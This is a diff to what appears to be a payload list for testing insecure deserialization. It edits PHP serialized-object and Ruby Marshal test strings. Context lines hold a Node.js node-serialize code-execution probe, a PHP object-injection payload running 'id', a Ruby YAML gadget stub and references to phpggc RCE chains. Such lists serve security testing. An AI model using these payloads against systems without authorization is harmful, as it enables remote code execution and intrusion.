@@ -65,8 +65,8 @@ payloads:
   # --- PHP Object Injection ---
   # Generic object injection
   - 'O:8:"Exploit":1:{s:7:"command";s:2:"id";}'
-  # Null byte injection
-  - 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:0:"";}'
+  # PHP object injection — deserialized User object with admin name
+  - 'O:4:"User":1:{s:4:"name";s:5:"admin";}'
   # PHP Monolog gadget (stub - replace with real gadget chain payload from phpggc)
   # phpggc Monolog/RCE1 system id | base64
   # Array wrapper bypass
@@ -89,8 +89,8 @@ payloads:
   - '{"rce":"_$$ND_FUNC$$_function (){console.log(\"pwned\")}()"}'
 
   # --- Ruby Marshal ---
-  # Base64 encoded Marshal payload
-  - "BAh7BjoJbmFtZSSi"
+  # Ruby Marshal (empty array)
+  - "BAhbAA=="
   # YAML.load (unsafe)
   - "--- !ruby/object:Gem::Installer\n    i: x\n"
   
